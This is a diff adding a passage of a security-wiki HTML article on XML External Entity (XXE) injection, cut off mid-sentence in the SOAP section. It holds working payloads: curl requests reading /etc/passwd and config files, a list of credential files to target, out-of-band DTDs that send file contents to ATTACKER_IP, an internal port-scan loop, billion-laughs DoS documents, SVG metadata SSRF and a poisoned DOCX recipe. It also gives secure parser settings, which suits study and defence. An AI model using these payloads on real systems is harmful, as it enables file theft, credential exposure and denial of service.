@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>XXE | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="XXE">
+		<meta name="keywords" content="denial-of-service, dtd, file-disclosure, redteam, ssrf, xml, xxe">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="XXE">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="XML External Entity injection tricks XML parsers into resolving attacker-controlled entities for file disclosure, server-side request forgery, and denial of service.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/xxe.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="XXE">
+		<meta name="twitter:description" itemprop="description" content="XML External Entity injection tricks XML parsers into resolving attacker-controlled entities for file disclosure, server-side request forgery, and denial of service.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xml-parsing-pipeline">XML Parsing Pipeline</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xml-structural-elements">XML Structural Elements</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#why-xxe-exists">Why XXE Exists</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#in-band-xxe-entity-revealed-in-response">In-Band XXE: Entity Revealed in Response</a></b>
+					<ul>
+						<li><a href="#manual-exploitation-with-curl">Manual exploitation with curl</a></li>
+						<li><a href="#key-linux-files-to-target">Key Linux Files to Target</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#out-of-band-blind-xxe">Out-of-Band (Blind) XXE</a></b>
+					<ul>
+						<li><a href="#basic-oob-exfiltration">Basic OOB Exfiltration</a></li>
+						<li><a href="#host-the-malicious-dtd">Host the Malicious DTD</a></li>
+						<li><a href="#request-the-external-dtd">Request the External DTD</a></li>
+						<li><a href="#how-this-works">How this works</a></li>
+						<li><a href="#multiple-file-exfiltration">Multiple file exfiltration</a></li>
+						<li><a href="#port-scanning-via-oob-xxe">Port Scanning via OOB XXE</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#error-based-xxe">Error-Based XXE</a></b>
+					<ul>
+						<li><a href="#php-error-based-xxe">PHP Error-Based XXE</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#billion-laughs-xml-bomb">Billion Laughs (XML Bomb)</a></b>
+					<ul>
+						<li><a href="#quadratic-blowup">Quadratic Blowup</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-in-different-parsers">XXE in Different Parsers</a></b>
+					<ul>
+						<li><a href="#libxml2-php">libxml2 (PHP)</a></li>
+						<li><a href="#xerces-java">Xerces (Java)</a></li>
+						<li><a href="#lxml-python">lxml (Python)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-in-file-uploads">XXE in File Uploads</a></b>
+					<ul>
+						<li><a href="#svg-files">SVG Files</a></li>
+						<li><a href="#docxxlsxpptx-office-open-xml">DOCX/XLSX/PPTX (Office Open XML)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-via-soap">XXE via SOAP</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-in-json-endpoints">XXE in JSON Endpoints</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-ssrf-rce-chain">XXE -> SSRF -> RCE Chain</a></b>
+					<ul>
+						<li><a href="#step-1-source-code-disclosure">Step 1: Source code disclosure</a></li>
+						<li><a href="#decode-config-find-credentials">Decode Config, Find Credentials</a></li>
+						<li><a href="#ssrf-to-internal-admin-panel">SSRF to Internal Admin Panel</a></li>
+						<li><a href="#webshell-or-backup-restore">Webshell or Backup Restore</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#xxe-bypass-techniques">XXE Bypass Techniques</a></b>
+					<ul>
+						<li><a href="#utf-7-encoding">UTF-7 Encoding</a></li>
+						<li><a href="#parameter-entity-wrapping">Parameter Entity Wrapping</a></li>
+						<li><a href="#external-dtd-bypass">External DTD Bypass</a></li>
+						<li><a href="#cdata-wrapping-for-binary-files">CDATA Wrapping for Binary Files</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection">Detection</a></b>
+					<ul>
+						<li><a href="#find-xml-inputs-first">Find XML inputs first</a></li>
+						<li><a href="#confirm-xxe-with-a-benign-test">Confirm XXE with a benign test</a></li>
+						<li><a href="#test-for-external-entities">Test for external entities</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fixes">Fixes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/xxe.html">Xxe</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="xxe">XXE</h2>
+					<p>
+						<abbr title="Extensible Markup Language">XML</abbr>
+						External Entity injection tricks
+						<abbr title="Extensible Markup Language">XML</abbr>
+						parsers into resolving attacker-controlled entities for file disclosure, server-side request
+						forgery, and denial of service.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							<abbr title="Extensible Markup Language">XML</abbr>
+							is self-describing by design: a document may declare its own
+							grammar and pull external resources through a Document Type Definition. A parser that resolves
+							those declarations without restriction turns the same mechanism that enables shared schemas
+							into a primitive for local file reads, outbound requests, and memory exhaustion. This article
+							follows a document from DTD processing through entity resolution, demonstrates in-band, out-of-band,
+							and error-based exfiltration, and lists the parser settings that disable the attack.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - <abbr title="Hypertext Transfer Protocol">HTTP</abbr> POST, Content-Type negotiation, request/response structure</li>
+							<li><a href="/wiki/articles/fundamentals/filesystems.html">Filesystems</a> - Linux file system layout, sensitive files and their locations</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="xml-parsing-pipeline">XML Parsing Pipeline</h3>
+						<p>
+							<abbr title="Extensible Markup Language">XML</abbr>
+							parsers process documents through these stages:
+						</p>
+						<pre class="plaintext">
+XML Document → DTD Processing → Entity Resolution → Document Tree → Output
+                 ^               ^
+                 Attack Surface  Attack Surface
+						</pre>
+						<p>
+							Each stage is a trust boundary. If the parser trusts the document's declarations, the document
+							can make the parser perform arbitrary file reads, network requests, and infinite loops.
+						</p>
+					</section>
+					<section>
+						<h3 id="xml-structural-elements">XML Structural Elements</h3>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!-- Internal DTD subset --&gt;
+    &lt;!ENTITY author &#34;cookiengineer&#34;&gt;
+    &lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+    &lt;!ENTITY % param &#34;&lt;!ENTITY exfil SYSTEM &#39;http://attacker/?%file;&#39;&gt;&#34;&gt;
+    %param;
+]&gt;
+&lt;root&gt;
+    &lt;content&gt;&amp;file;&lt;/content&gt;
+&lt;/root&gt;
+						</pre>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Declaration</th>
+									<th align="center">Purpose</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>&lt;!ENTITY name &#34;value&#34;&gt;</code></td>
+									<td align="center">Internal entity: simple text substitution</td>
+								</tr>
+								<tr>
+									<td align="center"><code>&lt;!ENTITY name SYSTEM &#34;URI&#34;&gt;</code></td>
+									<td align="center">External entity: reads from URI (file://, http://, ftp://)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>&lt;!ENTITY name PUBLIC &#34;id&#34; &#34;URI&#34;&gt;</code></td>
+									<td align="center">Public entity: registered public identifier with fallback URI</td>
+								</tr>
+								<tr>
+									<td align="center"><code>&lt;!ENTITY % name &#34;value&#34;&gt;</code></td>
+									<td align="center">Parameter entity: entity usable only within DTD, prefixed with<code>%</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>%name;</code></td>
+									<td align="center">Parameter entity reference (only in DTD)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>&amp;name;</code></td>
+									<td align="center">General entity reference (in document body)</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="why-xxe-exists">Why XXE Exists</h3>
+						<p>
+							<abbr title="Extensible Markup Language">XML</abbr>
+							is a markup language from 1998 designed for document exchange.
+							The designers wanted
+							<abbr title="Extensible Markup Language">XML</abbr>
+							to be self-referential: a document could
+							define its own document type and pull in external resources. The DTD mechanism was meant for
+							shared schemas, but it allowed arbitrary
+							<abbr title="Uniform Resource Identifier">URI</abbr>
+							resolution. Parsers
+							implemented the spec faithfully. Nobody considered malicious documents because the original
+							threat model was "well-formed documents exchanged between cooperating parties."
+						</p>
+					</section>
+					<section>
+						<h3 id="in-band-xxe-entity-revealed-in-response">In-Band XXE: Entity Revealed in Response</h3>
+						<p>
+							The parsed entity value appears directly in the
+							<abbr title="Extensible Markup Language">XML</abbr>
+							output. This
+							is the simplest case.
+						</p>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+]&gt;
+&lt;order&gt;
+    &lt;item&gt;&amp;xxe;&lt;/item&gt;
+    &lt;quantity&gt;1&lt;/quantity&gt;
+&lt;/order&gt;
+						</pre>
+						<h4 id="manual-exploitation-with-curl">Manual exploitation with curl</h4>
+						<pre class="bash">
+# Basic file read — /etc/passwd
+curl -X POST &#39;http://target/order&#39; \
+  -H &#39;Content-Type: application/xml&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;&#39;
+
+# Read application source code
+curl -X POST &#39;http://target/order&#39; \
+  -H &#39;Content-Type: application/xml&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///var/www/html/config.php&#34;&gt;]&gt;
+&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;&#39;
+
+# Read PHP source without parsing (php:// filter wrapper)
+curl -X POST &#39;http://target/order&#39; \
+  -H &#39;Content-Type: application/xml&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=config.php&#34;&gt;]&gt;
+&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;&#39;
+						</pre>
+						<p>
+							The base64-encoded
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							source appears in the response, avoiding
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							execution.
+						</p>
+						<h4 id="key-linux-files-to-target">Key Linux Files to Target</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">File</th>
+									<th align="center">Content</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>/etc/passwd</code></td>
+									<td align="center">User accounts (world-readable)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/shadow</code></td>
+									<td align="center">Password hashes (root-only, usually)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/hosts</code></td>
+									<td align="center">Internal hostnames and IPs</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/hostname</code></td>
+									<td align="center">Machine hostname</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/environ</code></td>
+									<td align="center">Environment variables (secrets, database URLs)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/cmdline</code></td>
+									<td align="center">Command that started the process</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/cwd</code></td>
+									<td align="center">Current working directory (symlink, need<code>/proc/self/cwd/index.php</code>)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/net/tcp</code></td>
+									<td align="center">Active TCP connections (internal services)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/net/arp</code></td>
+									<td align="center">ARP table (other hosts on network)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/version</code></td>
+									<td align="center">Kernel version</td>
+								</tr>
+								<tr>
+									<td align="center"><code>~/.ssh/id_rsa</code></td>
+									<td align="center">SSH private key</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/html/config.php</code></td>
+									<td align="center">Web app database credentials</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/.env</code></td>
+									<td align="center">Application secrets (Laravel, Symfony)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.bash_history</code></td>
+									<td align="center">Command history</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/fstab</code></td>
+									<td align="center">Mounted file systems</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="out-of-band-blind-xxe">Out-of-Band (Blind) XXE</h3>
+						<p>
+							When the server doesn't echo entities in the response, exfiltrate data by forcing the parser
+							to make an
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							request to an attacker-controlled server.
+						</p>
+						<h4 id="basic-oob-exfiltration">Basic OOB Exfiltration</h4>
+						<h4 id="host-the-malicious-dtd">Host the Malicious DTD</h4>
+						<pre class="bash">
+# On attacker machine, serve the DTD:
+mkdir /tmp/xxe-serve
+cat &gt; /tmp/xxe-serve/evil.dtd &lt;&lt; &#39;EOF&#39;
+&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://ATTACKER_IP:8888/?data=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfiltrate;
+EOF
+
+cd /tmp/xxe-serve &amp;&amp; python3 -m http.server 8888
+						</pre>
+						<h4 id="request-the-external-dtd">Request the External DTD</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % remote SYSTEM &#34;http://ATTACKER_IP:8888/evil.dtd&#34;&gt;
+    %remote;
+]&gt;
+&lt;foo&gt;bar&lt;/foo&gt;
+						</pre>
+						<h4 id="how-this-works">How this works</h4>
+						<ol>
+							<li>Parser reads the initial <abbr title="Extensible Markup Language">XML</abbr> , sees <code>%remote;</code> referencing <code>http://ATTACKER_IP:8888/evil.dtd</code></li>
+							<li>Parser fetches <code>evil.dtd</code> from the attacker</li>
+							<li>Inside the DTD: <code>%file;</code> reads <code>/etc/hostname</code> into the entity</li>
+							<li><code>%eval;</code> dynamically defines <code>&amp;#x25;exfiltrate</code> (i.e., <code>%exfiltrate</code> ) containing a <abbr title="Uniform Resource Locator">URL</abbr> with the file data</li>
+							<li><code>%exfiltrate;</code> triggers an <abbr title="Hypertext Transfer Protocol">HTTP</abbr> request to the attacker with the file contents in the query string</li>
+						</ol>
+						<h4 id="multiple-file-exfiltration">Multiple file exfiltration</h4>
+						<pre class="xml">
+&lt;!-- evil.dtd on attacker server --&gt;
+&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY % start &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ATTACKER_IP:8888/?%file;&#39;&gt;&#34;&gt;
+%start;
+%send;
+						</pre>
+						<h4 id="port-scanning-via-oob-xxe">Port Scanning via OOB XXE</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % xxe SYSTEM &#34;http://192.168.1.1:22/doesnotexist&#34;&gt;
+    %xxe;
+]&gt;
+						</pre>
+						<p>Time difference reveals if the port is open (fast error for open, timeout for closed).</p>
+						<pre class="bash">
+# Automate internal port scanning via XXE
+for port in 22 80 443 3306 6379 8080 9200 27017; do
+    time curl -s -X POST &#39;http://target/vuln&#39; \
+      -H &#39;Content-Type: application/xml&#39; \
+      -d &#34;&lt;?xml version=\&#34;1.0\&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \&#34;http://127.0.0.1:$port/doesnotexist\&#34;&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#34; &gt; /dev/null
+    echo &#34;Port $port: $?&#34;
+done
+						</pre>
+					</section>
+					<section>
+						<h3 id="error-based-xxe">Error-Based XXE</h3>
+						<p>
+							When both in-band and OOB channels are blocked, force the parser to emit an error message containing
+							the exfiltrated data. The error goes to the
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							response or
+							log file.
+						</p>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+    &lt;!ENTITY % error_entity SYSTEM &#34;file:///nonexistent/%file;&#34;&gt;
+    %error_entity;
+]&gt;
+						</pre>
+						<p>
+							The parser tries to read a file whose path contains
+							<code>/etc/passwd</code>
+							contents. The path is invalid,
+							producing a
+							<code>FileNotFoundException</code>
+							or similar with the sensitive data embedded in the error
+							text.
+						</p>
+						<h4 id="php-error-based-xxe">PHP Error-Based XXE</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY&gt;
+    &lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+    &lt;!ENTITY % dtd SYSTEM &#34;http://attacker/evil.dtd&#34;&gt;
+    %dtd;
+]&gt;
+&lt;foo&gt;&amp;send;&lt;/foo&gt;
+						</pre>
+						<p>
+							Where
+							<code>evil.dtd</code>
+							:
+						</p>
+						<pre class="xml">
+&lt;!ENTITY % payload &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:///nope/%file;&#39;&gt;&#34;&gt;
+%payload;
+						</pre>
+					</section>
+					<section>
+						<h3 id="billion-laughs-xml-bomb">Billion Laughs (XML Bomb)</h3>
+						<p>
+							Exponential entity expansion causes
+							<abbr title="Denial of Service">DoS</abbr>
+							by consuming all available memory.
+							Also called the "
+							<abbr title="Extensible Markup Language">XML</abbr>
+							Bomb" or "Exponential Entity Expansion"
+							attack.
+						</p>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE lolz [
+    &lt;!ENTITY lol &#34;lol&#34;&gt;
+    &lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;
+    &lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;
+    &lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;
+    &lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;
+    &lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;
+    &lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;
+    &lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;
+    &lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;
+    &lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+						</pre>
+						<p>
+							By
+							<code>lol9</code>
+							, the expansion is 10^9 "lol" strings, consuming~3GB of memory. This will crash most
+							parsers.
+						</p>
+						<h4 id="quadratic-blowup">Quadratic Blowup</h4>
+						<p>
+							A subtler
+							<abbr title="Denial of Service">DoS</abbr>
+							uses recursive entity definitions with quadratic growth:
+						</p>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE bomb [
+    &lt;!ENTITY a &#34;aaaaaaaaaaaaaaaaaaaaa...&#34;&gt;  &lt;!-- 50KB string --&gt;
+]&gt;
+&lt;bomb&gt;
+    &lt;item&gt;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&lt;/item&gt;
+    &lt;item&gt;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&lt;/item&gt;
+    &lt;!-- Repeat 200+ times --&gt;
+&lt;/bomb&gt;
+						</pre>
+						<p>
+							This doesn't crash instantly but consumes
+							<abbr title="Central Processing Unit">CPU</abbr>
+							and memory proportionally
+							to the number of references.
+						</p>
+					</section>
+					<section>
+						<h3 id="xxe-in-different-parsers">XXE in Different Parsers</h3>
+						<h4 id="libxml2-php">libxml2 (PHP)</h4>
+						<p>
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							's
+							<abbr title="Document Object Model">DOM</abbr>
+							Document, Simple
+							<abbr title="Extensible Markup Language">XML</abbr>
+							, and
+							<abbr title="Extensible Markup Language">XML</abbr>
+							Reader all use libxml2. External entity loading has
+							been disabled by default since
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							8.0, and entity substitution
+							only happens when the application passes
+							<code>LIBXML_NOENT</code>
+							explicitly.
+						</p>
+						<pre class="php">
+// Vulnerable — explicitly substitutes entities
+$xml = file_get_contents(&#39;php://input&#39;);
+$doc = new DOMDocument();
+$doc-&gt;loadXML($xml, LIBXML_NOENT);
+echo $doc-&gt;textContent;
+
+// Also vulnerable
+simplexml_load_string($xml, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);
+
+// Secure — does not substitute entities (since PHP 8.0 default)
+$doc = new DOMDocument();
+$doc-&gt;loadXML($xml);
+						</pre>
+						<p>
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							via
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							stream wrappers within
+							<abbr title="XML External Entity">XXE</abbr>
+							:
+						</p>
+						<pre class="xml">
+&lt;!-- expect:// can execute commands if enabled --&gt;
+&lt;!ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;
+
+&lt;!-- php://filter for source code --&gt;
+&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;
+
+&lt;!-- data:// for inline SSRF --&gt;
+&lt;!ENTITY xxe SYSTEM &#34;data://text/plain;base64,SGVsbG8gV29ybGQ=&#34;&gt;
+						</pre>
+						<h4 id="xerces-java">Xerces (Java)</h4>
+						<p>
+							Java's default
+							<abbr title="Extensible Markup Language">XML</abbr>
+							parser for JAXP.
+							<abbr title="XML External Entity">XXE</abbr>
+							is enabled by default.
+						</p>
+						<pre class="java">
+// Vulnerable
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xml)));
+
+// Secure — disable doctypes completely
+factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);
+
+// Secure — disable external entities
+factory.setFeature(&#34;http://xml.org/sax/features/external-general-entities&#34;, false);
+factory.setFeature(&#34;http://xml.org/sax/features/external-parameter-entities&#34;, false);
+						</pre>
+						<h4 id="lxml-python">lxml (Python)</h4>
+						<p>
+							Python's lxml resolves only internal entities by default (
+							<code>resolve_entities=&#39;internal&#39;</code>
+							),
+							so external entities are not fetched. Code that sets
+							<code>resolve_entities=True</code>
+							and loads a DTD
+							becomes vulnerable.
+						</p>
+						<pre class="python">
+# Secure (default): external entities are not resolved
+from lxml import etree
+parser = etree.XMLParser()
+tree = etree.fromstring(xml, parser)
+
+# Vulnerable: resolves external entities and loads the DTD
+parser = etree.XMLParser(resolve_entities=True, load_dtd=True)
+tree = etree.fromstring(xml, parser)
+						</pre>
+					</section>
+					<section>
+						<h3 id="xxe-in-file-uploads">XXE in File Uploads</h3>
+						<h4 id="svg-files">SVG Files</h4>
+						<p>
+							SVG is
+							<abbr title="Extensible Markup Language">XML</abbr>
+							. Any application that accepts SVG uploads and renders
+							them server-side is vulnerable.
+						</p>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE svg [
+    &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+]&gt;
+&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;200&#34; height=&#34;200&#34;&gt;
+    &lt;text x=&#34;10&#34; y=&#34;20&#34; font-size=&#34;16&#34; fill=&#34;red&#34;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+						</pre>
+						<p>
+							The SVG renders the contents of
+							<code>/etc/passwd</code>
+							as visible text in the image.
+						</p>
+						<pre class="bash">
+# SVG SSRF — make the server request an internal URL
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE svg [
+    &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/&#34;&gt;
+]&gt;
+&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;200&#34; height=&#34;200&#34;&gt;
+    &lt;text x=&#34;10&#34; y=&#34;20&#34; font-size=&#34;16&#34; fill=&#34;red&#34;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+						</pre>
+						<h4 id="docxxlsxpptx-office-open-xml">DOCX/XLSX/PPTX (Office Open XML)</h4>
+						<p>
+							Office Open
+							<abbr title="Extensible Markup Language">XML</abbr>
+							files are
+							<code>ZIP</code>
+							archives containing
+							<abbr title="Extensible Markup Language">XML</abbr>
+							documents. Embed
+							<abbr title="XML External Entity">XXE</abbr>
+							in the
+							<code>word/document.xml</code>
+							within the archive:
+						</p>
+						<pre class="bash">
+# Extract, modify, repack
+unzip report.docx -d docx/
+vim docx/word/document.xml  # Add DOCTYPE with XXE entity
+cd docx &amp;&amp; zip -r ../exploit.docx . &amp;&amp; cd ..
+
+# Upload exploit.docx — the server&#39;s XML parser processes document.xml
+						</pre>
+					</section>
+					<section>
+						<h3 id="xxe-via-soap">XXE via SOAP</h3>
+						<p>
+							<code>SOAP</code>
+							requests are always
+							<abbr title="Extensible Markup Language">XML</abbr>
+							. Most
+							<code>SOAP</code>
+							services accept custom
